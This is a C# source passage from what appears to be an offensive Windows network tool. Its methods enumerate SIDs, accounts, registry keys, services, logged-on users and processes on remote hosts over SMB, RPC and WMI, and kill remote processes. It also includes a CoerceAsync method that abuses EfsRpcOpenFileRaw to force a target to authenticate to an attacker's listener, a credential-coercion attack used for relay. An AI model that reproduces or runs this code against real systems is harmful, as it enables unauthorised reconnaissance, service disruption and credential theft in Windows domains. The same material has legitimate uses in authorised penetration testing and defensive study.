	private async Task LookupSidsAsync(Smb2Client smb, string host, string spec, CancellationToken cancellationToken)
	{
		var sids = spec.Split(',', StringSplitOptions.TrimEntries | StringSplitOptions.RemoveEmptyEntries)
			.Select(s => Titanis.Winterop.Security.SecurityIdentifier.Parse(s)).ToArray();
		Mslsar.LsaPolicy policy;
		try
		{
			policy = await this.OpenLsaPolicyAsync(smb, host, cancellationToken).ConfigureAwait(false);
		}
		catch (Exception ex)
		{
			AtlasConsole.Fail($"{host}:{this.Port}", $"--lookup-sid: open LSA policy failed: {(this.Verbose.IsSet ? ex.ToString() : ex.Message)}");
			return;
		}
		using (policy)
		foreach (var sid in sids)
		{
			try
			{
				var m = await policy.ResolveSidAsync(sid, cancellationToken).ConfigureAwait(false);
				string display = string.IsNullOrEmpty(m.DomainName) ? m.AccountName : $"{m.DomainName}\\{m.AccountName}";
				AtlasConsole.Success($"{host}:{this.Port}", $"{sid} -> {display} (type={m.NameType})");
			}
			catch (Exception ex)
			{
				AtlasConsole.Fail($"{host}:{this.Port}", $"{sid}: {ex.Message}");
			}
		}
	}

	private async Task LookupNamesAsync(Smb2Client smb, string host, string spec, CancellationToken cancellationToken)
	{
		var names = spec.Split(',', StringSplitOptions.TrimEntries | StringSplitOptions.RemoveEmptyEntries).ToArray();
		using var policy = await this.OpenLsaPolicyAsync(smb, host, cancellationToken).ConfigureAwait(false);
		foreach (var name in names)
		{
			try
			{
				var m = await policy.ResolveAccountName(name, cancellationToken).ConfigureAwait(false);
				AtlasConsole.Success($"{host}:{this.Port}", $"{name} -> {m.AccountSid} ({m.DomainName}\\{m.AccountName} type={m.NameType})");
			}
			catch (Exception ex)
			{
				AtlasConsole.Fail($"{host}:{this.Port}", $"{name}: {ex.Message}");
			}
		}
	}

	private async Task RegQueryAsync(Smb2Client smb, string host, string keyPath, string? valueName, CancellationToken cancellationToken)
	{
		using RemoteRegistryClient reg = await this.BindWinregAsync(smb, host, cancellationToken).ConfigureAwait(false);
		var parsed = RegistryPath.Parse(keyPath);
		await using var root = await reg.OpenRootKey(parsed.Root, RegistryAccessRights.EnumerateSubkeys | RegistryAccessRights.QueryValue, cancellationToken).ConfigureAwait(false);
		if (parsed.IsRootPath)
		{
			await this.DumpRegKeyAsync(host, keyPath, root, valueName, cancellationToken).ConfigureAwait(false);
			return;
		}
		await using var subkey = await root.OpenSubkey(parsed.KeyPath, RegistryAccessRights.EnumerateSubkeys | RegistryAccessRights.QueryValue, RegistryKeyOptions.None, cancellationToken).ConfigureAwait(false);
		await this.DumpRegKeyAsync(host, keyPath, subkey, valueName, cancellationToken).ConfigureAwait(false);
	}

	private async Task DumpRegKeyAsync(string host, string keyPath, RegistryKey key, string? valueName, CancellationToken cancellationToken)
	{
		if (valueName is not null)
		{
			var value = await key.GetValue(valueName, cancellationToken).ConfigureAwait(false);
			AtlasConsole.Success($"{host}:{this.Port}", $"{keyPath}!{value.Name} [{value.ValueType}] = {FormatRegValue(value)}");
			return;
		}
		await foreach (var sub in key.GetSubkeyNames(cancellationToken).ConfigureAwait(false))
			AtlasConsole.Success($"{host}:{this.Port}", $"[{keyPath}] subkey: {sub.KeyName}");
		await foreach (var value in key.GetValues(true, cancellationToken).ConfigureAwait(false))
			AtlasConsole.Success($"{host}:{this.Port}", $"[{keyPath}] {value.Name} [{value.ValueType}] = {FormatRegValue(value)}");
	}

	private static string FormatRegValue(RegistryValueInfo value)
	{
		if (value.TypedValue is not null)
			return value.TypedValue.ToString() ?? string.Empty;
		if (value.Bytes is not null)
			return Convert.ToHexString(value.Bytes);
		return string.Empty;
	}

	private async Task EnumServicesAsync(Smb2Client smb, string host, CancellationToken cancellationToken)
	{
		RpcClient rpc = this.Services.CreateRpcClient();
		ScmClient scmClient = new ScmClient();
		string pipe = scmClient.WellKnownPipeName ?? "svcctl";
		await rpc.ConnectPipe(scmClient, smb, new UncPath(host, Smb2Client.IpcName, pipe), cancellationToken).ConfigureAwait(false);
		using var scm = await scmClient.OpenScm(ScmAccessRights.EnumerateService, cancellationToken).ConfigureAwait(false);
		var services = await scm.GetServicesAsync(cancellationToken).ConfigureAwait(false);
		foreach (var svc in services)
			AtlasConsole.Success($"{host}:{this.Port}", $"service: {svc.ServiceName} state={svc.State} type={svc.ServiceType} display='{svc.DisplayName}'");
		AtlasConsole.Info($"{host}:{this.Port}", $"--services: {services.Count} service(s)");
	}

	private async Task LoggedOnUsersAsync(Smb2Client smb, string host, CancellationToken cancellationToken)
	{
		using RemoteRegistryClient reg = await this.BindWinregAsync(smb, host, cancellationToken).ConfigureAwait(false);
		using var lsa = await this.OpenLsaPolicyAsync(smb, host, cancellationToken).ConfigureAwait(false);
		await using var hku = await reg.OpenUsers(RegistryAccessRights.KeyRead, cancellationToken).ConfigureAwait(false);
		int count = 0;
		await foreach (var sub in hku.GetSubkeyNames(cancellationToken).ConfigureAwait(false))
		{
			string sid = sub.KeyName;
			if (sid.Equals(".DEFAULT", StringComparison.OrdinalIgnoreCase) || sid.EndsWith("_Classes", StringComparison.OrdinalIgnoreCase))
				continue;
			if (!sid.StartsWith("S-1-5-21-", StringComparison.OrdinalIgnoreCase))
				continue;
			string display = sid;
			try
			{
				var m = await lsa.ResolveSidAsync(Titanis.Winterop.Security.SecurityIdentifier.Parse(sid), cancellationToken).ConfigureAwait(false);
				display = string.IsNullOrEmpty(m.DomainName) ? m.AccountName : $"{m.DomainName}\\{m.AccountName}";
			}
			catch { }
			count++;
			AtlasConsole.Success($"{host}:{this.Port}", $"logged-on user: {display} ({sid})");
		}
		AtlasConsole.Info($"{host}:{this.Port}", $"--loggedon-users: {count} user hive(s) loaded");
	}

	private async Task<WmiClient> ConnectWmiAsync(string host, CancellationToken cancellationToken)
	{
		DcomClient dcom = await this.ConnectDcomAsync(host, cancellationToken).ConfigureAwait(false);
		string workstation = this.Authentication.Workstation ?? string.Empty;
		int orpId = Random.Shared.Next(1024, 65535) & ~0x03;
		WmiClient wmi = await WmiClient.ConnectTo(workstation, orpId, dcom, cancellationToken).ConfigureAwait(false);
		return wmi;
	}

	private async Task TaskListAsync(string host, string? filter, CancellationToken cancellationToken)
	{
		WmiClient wmi = await this.ConnectWmiAsync(host, cancellationToken).ConfigureAwait(false);
		var ns = await wmi.OpenNamespace(WmiClient.RootCimV2Namespace, "en-US", cancellationToken).ConfigureAwait(false);
		var reader = await ns.ExecuteWqlQueryAsync("SELECT ProcessId, Name FROM Win32_Process", 20, cancellationToken).ConfigureAwait(false);
		int count = 0;
		while (await reader.ReadAsync(cancellationToken).ConfigureAwait(false))
		{
			if (reader.Current is not WmiInstanceObject inst) continue;
			string name = string.Empty;
			string pid = string.Empty;
			foreach (var prop in inst.Properties)
			{
				if (prop.ClassProperty?.Name == "Name") name = prop.Value?.ToString() ?? string.Empty;
				if (prop.ClassProperty?.Name == "ProcessId") pid = prop.Value?.ToString() ?? string.Empty;
			}
			if (!string.IsNullOrEmpty(filter) && !name.Contains(filter, StringComparison.OrdinalIgnoreCase) && !pid.Equals(filter, StringComparison.OrdinalIgnoreCase))
				continue;
			count++;
			AtlasConsole.Success($"{host}:{this.Port}", $"process: {name} (PID {pid})");
		}
		AtlasConsole.Info($"{host}:{this.Port}", $"--tasklist: {count} process(es)");
	}

	private async Task TaskKillAsync(string host, string target, CancellationToken cancellationToken)
	{
		WmiClient wmi = await this.ConnectWmiAsync(host, cancellationToken).ConfigureAwait(false);
		var ns = await wmi.OpenNamespace(WmiClient.RootCimV2Namespace, "en-US", cancellationToken).ConfigureAwait(false);
		// Prime the scope class cache: query/direct-get instances lack method metadata.
		_ = await ns.GetObjectAsync("Win32_Process", cancellationToken).ConfigureAwait(false);
		var pids = new List<string>();
		if (uint.TryParse(target, out _))
		{
			pids.Add(target);
		}
		else
		{
			var reader = await ns.ExecuteWqlQueryAsync($"SELECT ProcessId FROM Win32_Process WHERE Name = '{target.Replace("'", "''")}'", 20, cancellationToken).ConfigureAwait(false);
			while (await reader.ReadAsync(cancellationToken).ConfigureAwait(false))
			{
				if (reader.Current is not WmiInstanceObject inst) continue;
				foreach (var prop in inst.Properties)
				{
					if (prop.ClassProperty?.Name == "ProcessId" && prop.Value is not null)
						pids.Add(prop.Value.ToString() ?? string.Empty);
				}
			}
		}
		int killed = 0;
		foreach (var pid in pids.Distinct())
		{
			cancellationToken.ThrowIfCancellationRequested();
			try
			{
				// Direct object get returns full-fidelity instances carrying method metadata.
				var proc = await ns.GetObjectAsync($"Win32_Process.Handle=\"{pid}\"", cancellationToken).ConfigureAwait(false);
				WmiInstanceObject result = await proc.InvokeMethodAsync("Terminate", new Dictionary<string, object?> { ["Reason"] = 0u }, cancellationToken).ConfigureAwait(false);
				uint ret = Convert.ToUInt32(result["ReturnValue"] ?? 1u);
				if (ret == 0)
				{
					killed++;
					AtlasConsole.Success($"{host}:{this.Port}", $"--taskkill: terminated {target} (PID {pid})");
				}
				else
					AtlasConsole.Fail($"{host}:{this.Port}", $"--taskkill: PID {pid} failed (ReturnValue={ret})");
			}
			catch (Exception ex)
			{
				AtlasConsole.Fail($"{host}:{this.Port}", $"--taskkill PID {pid}: {ex.Message}");
			}
		}
		if (killed == 0)
			AtlasConsole.Info($"{host}:{this.Port}", $"--taskkill: no matching process terminated for '{target}'");
	}

	private async Task CoerceAsync(Smb2Client smb, string host, string listener, CancellationToken cancellationToken)
	{
		string victimPath = listener.StartsWith(@"\\", StringComparison.Ordinal) ? listener : $@"\\{listener}\shared\docs";
		RpcClient rpc = this.Services.CreateRpcClient();
		EfsClient efs = new EfsClient();
		await rpc.ConnectPipe(efs, smb, new UncPath(host, Smb2Client.IpcName, EfsClient.EfsPipeName), cancellationToken).ConfigureAwait(false);
		try
		{
			await efs.OpenFile(victimPath, cancellationToken).ConfigureAwait(false);
			AtlasConsole.Success($"{host}:{this.Port}", $"--coerce: EFSRPC coerced via EfsRpcOpenFileRaw({victimPath}) (check listener for incoming auth)");
		}
		catch (Exception ex)
		{
			AtlasConsole.Warn($"{host}:{this.Port}", $"--coerce: {ex.Message} (auth may still have been triggered - check listener)");
		}
	}
}
